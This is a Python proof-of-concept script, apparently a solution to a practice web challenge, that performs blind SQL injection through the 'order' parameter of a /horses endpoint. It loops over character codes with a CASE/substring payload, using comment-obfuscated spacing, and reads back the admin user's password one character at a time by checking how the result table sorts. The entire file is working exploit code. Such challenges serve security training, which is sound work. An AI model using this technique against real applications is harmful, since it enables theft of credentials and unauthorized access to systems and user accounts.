#Solution for bmdyy's order challenge
#Challenge link: https://github.com/bmdyy/order
#PoC Author: ApexPredator
import requests, argparse, sys
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target', help='Target URL', required=True)
args = parser.parse_args()
http_proxy = "http://127.0.0.1:8080"
proxyDict = {
            "http" : http_proxy
        }

def orderby_sqli(target, query):
    for j in range(32, 126):
        url = "http://%s:5000/horses?order=%s" %(target, query.replace("[CHAR]", str(j)))
        r = requests.get(url, proxies=proxyDict)
        soup = BeautifulSoup(r.text, 'html.parser')
        table_rows = soup.table.find_all('tr')
        if 'Aaron' in table_rows[1].text:
            return j
    return None


def inject(r, target):
    extracted = ""
    for i in range(1, r):
        injection_string = "(CASE/**/WHEN/**/(ascii(substring((select/**/password/**/from/**/users/**/WHERE/**/username/**/='admin'),%d,1))=[CHAR])/**/THEN/**/name/**/ELSE/**/null/**/END)/**/--" %i
        retrieved_value = orderby_sqli(target, injection_string)
        if(retrieved_value):
            extracted += chr(retrieved_value)
            extracted_char = chr(retrieved_value)
            sys.stdout.write(extracted_char)
            sys.stdout.flush()
        else:
            print("\n[+] SQL Injection complete!")
            break
    return extracted

def main():

    target = args.target
    inject(30, target)

if __name__ == "__main__":
    main()
